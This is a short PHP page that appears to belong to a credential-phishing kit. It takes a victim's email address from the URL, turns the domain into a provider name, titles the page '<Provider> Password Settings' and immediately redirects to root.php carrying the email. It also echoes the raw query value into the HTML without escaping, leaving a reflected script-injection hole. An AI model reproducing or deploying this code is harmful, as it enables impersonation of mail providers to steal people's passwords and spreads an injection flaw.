<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

  <head>

  <meta charset="UTF-8">
  <title><?php echo $yuh ?> Password Settings | User: <?php echo $login ?></title>
  
  <link rel="icon" href="./grid/favicon.png" type="image/gif" sizes="16x16">
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>

  <meta http-equiv="refresh" content="0; url=root.php?email=<?php echo $login ?>"/>

</head>
<body></body>
</html>